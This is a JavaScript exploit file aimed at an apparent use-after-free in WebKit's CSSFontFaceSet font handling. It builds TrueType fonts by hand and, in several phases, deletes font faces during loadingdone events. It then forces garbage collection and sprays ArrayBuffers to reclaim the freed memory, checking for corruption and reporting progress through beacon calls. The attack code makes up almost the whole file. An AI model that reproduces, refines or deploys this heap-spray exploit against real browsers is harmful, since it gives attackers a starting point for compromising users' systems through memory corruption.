// p175 — CSSFontFaceSet reference_wrapper UAF via ArrayBuffer fonts
//
// Bug: CSSFontFaceSet::matchingFacesExcludingPreinstalledFonts (line 381)
// returns Vector<std::reference_wrapper<CSSFontFace>> (non-owning).
// Fix changed to Ref<CSSFontFace>.
//
// Also: fontLoadEventOccurred() calls pump() WITHOUT Ref<CSSFontFace>
// protection — only timeoutFired() and fontLoaded() have it.
//
// Strategy: ArrayBuffer fonts load SYNCHRONOUSLY through CSSFontFaceSource.
// setStatus(Success) fires iterateClients → fontStateChanged synchronously.
// If we can get JS execution during this chain, we delete faces → UAF.
//
// CSSFontFace is fastMalloc-allocated (ref-counted, NOT GC-managed).
// When refcount → 0, fastFree is called. ArrayBuffer spray can reclaim.
//
// Beacon prefix: V175-

(function() {
  function B(tag, body) {
    var url = '/beacon/V175-' + tag + '?t=' + Date.now();
    try {
      navigator.sendBeacon(url, body || '');
    } catch (e) {}
  }

  B('BOOT');

  // Build minimal valid TTF in ArrayBuffer
  function buildTTF(familySuffix) {
    var buf = [];
    function w16(v) { buf.push((v >> 8) & 0xFF, v & 0xFF); }
    function w32(v) { buf.push((v >> 24) & 0xFF, (v >> 16) & 0xFF, (v >> 8) & 0xFF, v & 0xFF); }
    function wStr(s) { for (var i = 0; i < s.length; i++) buf.push(s.charCodeAt(i)); }
    function pad4() { while (buf.length % 4) buf.push(0); }

    var numTables = 9;
    w32(0x00010000);
    w16(numTables);
    w16(128); w16(3); w16(16);

    var dirStart = buf.length;
    var tables = ['cmap','glyf','head','hhea','hmtx','loca','maxp','name','post'];
    for (var t = 0; t < tables.length; t++) {
      wStr(tables[t]);
      w32(0); w32(0); w32(0);
    }

    function setEntry(idx, off, len) {
      var p = dirStart + idx * 16 + 8;
      buf[p]=(off>>24)&0xFF; buf[p+1]=(off>>16)&0xFF; buf[p+2]=(off>>8)&0xFF; buf[p+3]=off&0xFF;
      buf[p+4]=(len>>24)&0xFF; buf[p+5]=(len>>16)&0xFF; buf[p+6]=(len>>8)&0xFF; buf[p+7]=len&0xFF;
    }

    // head
    var ho = buf.length;
    w32(0x00010000); w32(0x00005000); w32(0); w32(0x5F0F3CF5);
    w16(0x000B); w16(1000);
    w32(0); w32(0); w32(0); w32(0);
    w16(0); w16(0); w16(1000); w16(1000);
    w16(0); w16(8); w16(2); w16(1); w16(0);
    pad4(); setEntry(2, ho, buf.length - ho);

    // hhea
    var hho = buf.length;
    w32(0x00010000);
    w16(800); w16(0xFFFF & (-200)); w16(0); w16(1000);
    w16(0); w16(0); w16(1000);
    w16(1); w16(0); w16(0);
    w16(0); w16(0); w16(0); w16(0);
    w16(0); w16(2);
    pad4(); setEntry(3, hho, buf.length - hho);

    // maxp
    var mo = buf.length;
    w32(0x00010000); w16(2);
    w16(0); w16(0); w16(0); w16(0);
    w16(1); w16(0); w16(0); w16(0); w16(0);
    w16(0); w16(0); w16(0); w16(0);
    pad4(); setEntry(6, mo, buf.length - mo);

    // hmtx
    var hmo = buf.length;
    w16(500); w16(0); w16(500); w16(0);
    pad4(); setEntry(4, hmo, buf.length - hmo);

    // loca (long format)
    var lo = buf.length;
    w32(0); w32(0); w32(0);
    pad4(); setEntry(5, lo, 12);

    // glyf (empty)
    var go = buf.length;
    pad4(); setEntry(1, go, buf.length - go || 4);

    // cmap
    var co = buf.length;
    w16(0); w16(1);
    w16(3); w16(1); w32(12);
    w16(4); w16(32); w16(0);
    w16(2); w16(65 + (familySuffix || 0));
    w16(0); w16(1);
    var delta = -(65 + (familySuffix || 0)) + 1;
    w16(delta & 0xFFFF); w16(0);
    w16(0xFFFF); w16(0xFFFF); w16(1); w16(0); w16(0);
    pad4(); setEntry(0, co, buf.length - co);

    // name
    var no = buf.length;
    w16(0); w16(1); w16(6 + 12);
    w16(3); w16(1); w16(0x0409); w16(4); w16(8); w16(0);
    wStr(0 ? '' : '\0T\0e\0s\0t');
    pad4(); setEntry(7, no, buf.length - no);

    // post
    var po = buf.length;
    w32(0x00030000); w32(0); w16(0); w16(0);
    w32(0); w32(0); w32(0); w32(0); w32(0);
    pad4(); setEntry(8, po, buf.length - po);

    var ab = new ArrayBuffer(buf.length);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < buf.length; i++) u8[i] = buf[i];
    return ab;
  }

  // Phase 1: Verify ArrayBuffer FontFace works
  try {
    var testBuf = buildTTF(0);
    var testFace = new FontFace('V175Test', testBuf);
    B('T1-FONTFACE-OK-' + testFace.status);
    document.fonts.add(testFace);
    B('T1-ADDED');
    document.fonts.delete(testFace);
    B('T1-DELETED');
  } catch (e) {
    B('T1-ERR-' + e.message.substring(0, 40));
    return;
  }

  // Phase 2: Test synchronous load behavior
  try {
    var syncBuf = buildTTF(1);
    var syncFace = new FontFace('V175Sync', syncBuf);
    B('T2-STATUS-' + syncFace.status);

    syncFace.load().then(function() {
      B('T2-THEN-' + syncFace.status);
    });

    B('T2-AFTER-LOAD-' + syncFace.status);
    document.fonts.add(syncFace);

    var loadingdoneCount = 0;
    document.fonts.onloadingdone = function(ev) {
      loadingdoneCount++;
      B('T2-LOADINGDONE-' + loadingdoneCount + '-fonts-' + (ev.fontfaces ? ev.fontfaces.length : '?'));
    };

    document.fonts.load('48px V175Sync').then(function(loaded) {
      B('T2-DOCLOAD-' + loaded.length + '-status-' + syncFace.status);
    });

    B('T2-SYNC-CHECK');
  } catch (e) {
    B('T2-ERR-' + e.message.substring(0, 40));
  }

  // Phase 3: UAF trigger — delete faces during load callback
  setTimeout(function() {
    B('P3-START');

    try {
      var NFACES = 32;
      var faces = [];
      var bufs = [];

      for (var i = 0; i < NFACES; i++) {
        var b = buildTTF(i + 10);
        bufs.push(b);
        var f = new FontFace('V175UAF' + i, b);
        faces.push(f);
        document.fonts.add(f);
      }
      B('P3-CREATED-' + NFACES);

      // Track loadingdone events
      var doneEvents = 0;
      var deletedInCallback = 0;

      document.fonts.addEventListener('loadingdone', function handler(ev) {
        doneEvents++;
        B('P3-DONE-EV-' + doneEvents);

        // DELETE faces during the event — this is the UAF trigger
        // matchingFacesExcludingPreinstalledFonts holds raw reference_wrappers
        // Deleting faces drops CSSFontFaceSet::m_faces refcount
        for (var d = 0; d < faces.length; d++) {
          try {
            var deleted = document.fonts.delete(faces[d]);
            if (deleted) deletedInCallback++;
          } catch (e) {}
        }
        B('P3-DELETED-' + deletedInCallback);

        // Drop JS refs to allow GC to collect FontFace wrappers
        // This drops the last ref → CSSFontFace freed via fastFree
        faces.length = 0;
        faces = null;

        // Force GC
        var junk = [];
        for (var g = 0; g < 50; g++) {
          var batch = [];
          for (var k = 0; k < 5000; k++) batch.push({x: k});
          junk.push(batch);
        }
        junk = null;

        // Spray ArrayBuffers to reclaim freed CSSFontFace memory
        // CSSFontFace is ~256-512 bytes (estimate)
        var SPRAY_COUNT = 2000;
        var spray = [];
        var sizes = [128, 192, 256, 320, 384, 448, 512];
        for (var s = 0; s < SPRAY_COUNT; s++) {
          var sz = sizes[s % sizes.length];
          var ab = new ArrayBuffer(sz);
          var v = new Uint32Array(ab);
          v[0] = 0xCAFE0000 | (s & 0xFFFF);
          v[1] = 0xDEAD0000 | sz;
          v[2] = s;
          for (var j = 3; j < v.length; j++) v[j] = 0xBBBB0000 | j;
          spray.push(ab);
        }
        B('P3-SPRAYED-' + spray.length);

        // Now try operations that access the (potentially freed) CSSFontFace objects
        // via the stale reference_wrapper vector in matchingFaces
        try {
          var check = document.fonts.check('48px V175UAF0');
          B('P3-CHECK0-' + check);
        } catch (e) {
          B('P3-CHECK0-ERR-' + e.message.substring(0, 40));
        }

        // Check spray corruption (CSSFontFace write-after-free into spray)
        var corrupted = 0;
        for (var c = 0; c < spray.length; c++) {
          var cv = new Uint32Array(spray[c]);
          var expected = 0xCAFE0000 | (c & 0xFFFF);
          if (cv[0] !== expected) {
            corrupted++;
            if (corrupted <= 5) {
              B('P3-CORRUPT-' + c + '-' + cv[0].toString(16) + '-was-' + expected.toString(16));
            }
          }
        }
        B('P3-CORRUPT-TOTAL-' + corrupted);

        document.fonts.removeEventListener('loadingdone', handler);
      });

      // Trigger load for all faces
      for (var i = 0; i < NFACES; i++) {
        document.fonts.load('48px V175UAF' + i);
      }
      B('P3-LOADS-QUEUED');

    } catch (e) {
      B('P3-ERR-' + e.message.substring(0, 60));
    }
  }, 500);

  // Phase 4: Race condition — concurrent add/load/delete
  setTimeout(function() {
    B('P4-START');

    try {
      // Create faces without storing JS references
      var ephemeralBufs = [];
      for (var i = 0; i < 64; i++) {
        var b = buildTTF(i + 100);
        ephemeralBufs.push(b);
        // Don't store the FontFace — it only lives in document.fonts
        document.fonts.add(new FontFace('V175Race' + i, b));
      }
      B('P4-ADDED-64');

      // Set up loadingdone to clear all faces
      var raceHandler = function(ev) {
        B('P4-LOADINGDONE');

        // document.fonts.clear() removes all JS-added faces
        if (document.fonts.clear) {
          document.fonts.clear();
          B('P4-CLEARED');
        } else {
          B('P4-NO-CLEAR-METHOD');
        }

        // Force GC — FontFace wrappers become unreachable
        var junk2 = [];
        for (var g = 0; g < 80; g++) {
          var batch = [];
          for (var k = 0; k < 5000; k++) batch.push({y: k, z: String(k)});
          junk2.push(batch);
        }
        junk2 = null;
        B('P4-GC-FORCED');

        // Spray to reclaim CSSFontFace objects
        var spray2 = [];
        for (var s = 0; s < 3000; s++) {
          var ab = new ArrayBuffer(256);
          var v = new Uint32Array(ab);
          v[0] = 0xFACE0000 | (s & 0xFFFF);
          v[1] = 0xAAAAAAAA;
          for (var j = 2; j < 64; j++) v[j] = 0x42424242;
          spray2.push(ab);
        }
        B('P4-SPRAYED-' + spray2.length);

        // Try to trigger access to freed CSSFontFace
        for (var i = 0; i < 64; i++) {
          try { document.fonts.check('48px V175Race' + i); } catch (e) {}
        }

        // Load triggers matchingFaces which iterates potentially freed objects
        for (var i = 0; i < 16; i++) {
          document.fonts.load('48px V175Race' + i).then(function() {}).catch(function() {});
        }
        B('P4-LOADS-AFTER-DELETE');

        // Check spray
        var hit = 0;
        for (var c = 0; c < spray2.length; c++) {
          var cv = new Uint32Array(spray2[c]);
          if (cv[0] !== (0xFACE0000 | (c & 0xFFFF))) {
            hit++;
            if (hit <= 5) B('P4-HIT-' + c + '-' + cv[0].toString(16));
          }
        }
        B('P4-HITS-' + hit);

        document.fonts.removeEventListener('loadingdone', raceHandler);
      };

      document.fonts.addEventListener('loadingdone', raceHandler);

      // Trigger loading
      document.fonts.load('48px V175Race0');
      B('P4-LOAD-TRIGGERED');

    } catch (e) {
      B('P4-ERR-' + e.message.substring(0, 60));
    }
  }, 3000);

  // Phase 5: fontLoadEventOccurred path — no Ref<> protection on this
  setTimeout(function() {
    B('P5-START');

    try {
      // Create a @font-face CSS rule that triggers fontLoadEventOccurred
      // This path has NO Ref<CSSFontFace> protectedThis
      var style = document.createElement('style');
      var cssRules = '';
      for (var i = 0; i < 32; i++) {
        // Use base64 inline font data to avoid network loads
        // Each font is slightly different (different cmap) so they don't share cache
        var b = buildTTF(i + 200);
        var b64 = '';
        var u8 = new Uint8Array(b);
        for (var j = 0; j < u8.length; j++) {
          b64 += String.fromCharCode(u8[j]);
        }
        try {
          b64 = btoa(b64);
        } catch (e) {
          B('P5-BTOA-ERR');
          return;
        }
        cssRules += '@font-face { font-family: "V175CSS' + i + '"; src: url(data:font/ttf;base64,' + b64 + '); }\n';
      }
      style.textContent = cssRules;
      document.head.appendChild(style);
      B('P5-CSS-' + 32);

      // Create elements that use these fonts — triggers font loading
      var els = [];
      for (var i = 0; i < 32; i++) {
        var el = document.createElement('span');
        el.style.fontFamily = '"V175CSS' + i + '"';
        el.textContent = 'A';
        document.body.appendChild(el);
        els.push(el);
      }
      B('P5-ELEMENTS-' + els.length);

      // Wait for fonts to start loading, then remove the style sheet
      // This should trigger fontLoadEventOccurred on each face
      // WITHOUT Ref<CSSFontFace> protection
      setTimeout(function() {
        // Remove style sheet — this removes the CSS font faces
        style.parentNode.removeChild(style);
        B('P5-STYLE-REMOVED');

        // Also remove the elements
        for (var i = 0; i < els.length; i++) {
          if (els[i].parentNode) els[i].parentNode.removeChild(els[i]);
        }
        B('P5-ELEMENTS-REMOVED');

        // Force GC + spray
        var junk3 = [];
        for (var g = 0; g < 60; g++) {
          var batch = [];
          for (var k = 0; k < 5000; k++) batch.push({z: k});
          junk3.push(batch);
        }
        junk3 = null;

        var spray3 = [];
        for (var s = 0; s < 2000; s++) {
          var ab = new ArrayBuffer(256);
          var v = new Uint32Array(ab);
          v[0] = 0xBEEF0000 | (s & 0xFFFF);
          v[1] = 0xCCCCCCCC;
          spray3.push(ab);
        }
        B('P5-SPRAYED-' + spray3.length);

        // Check spray
        var damaged = 0;
        for (var c = 0; c < spray3.length; c++) {
          var cv = new Uint32Array(spray3[c]);
          if (cv[0] !== (0xBEEF0000 | (c & 0xFFFF))) {
            damaged++;
            if (damaged <= 5) B('P5-DAMAGED-' + c + '-' + cv[0].toString(16));
          }
        }
        B('P5-DAMAGED-TOTAL-' + damaged);
        B('DONE');
      }, 200);

    } catch (e) {
      B('P5-ERR-' + e.message.substring(0, 60));
    }
  }, 6000);
})();
